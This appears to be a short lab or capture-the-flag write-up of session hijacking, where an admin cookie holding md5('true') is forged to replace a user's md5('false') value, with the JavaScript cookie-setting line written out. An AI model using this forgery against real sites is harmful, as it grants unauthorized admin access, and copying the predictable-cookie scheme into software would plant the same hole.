# Session Hijacking via Predictable Cookie

## Vulnerability
Broken Access Control / Insecure Authentication

## Target
`http://{IP_ADDRESS}/`

## Mechanism
- Admin authentication used predictable MD5-hashed boolean in cookie:
  - User: `I_am_admin=md5('false')`
  - Admin: `I_am_admin=md5('true')`

## Exploit
1. Retrieved user cookie: `68934a3e9455fa72420237eb05902327`
2. Generated admin hash: `md5('true') = b326b5062b2f0e69046810717534cb09`
3. Set new cookie: `document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09"`

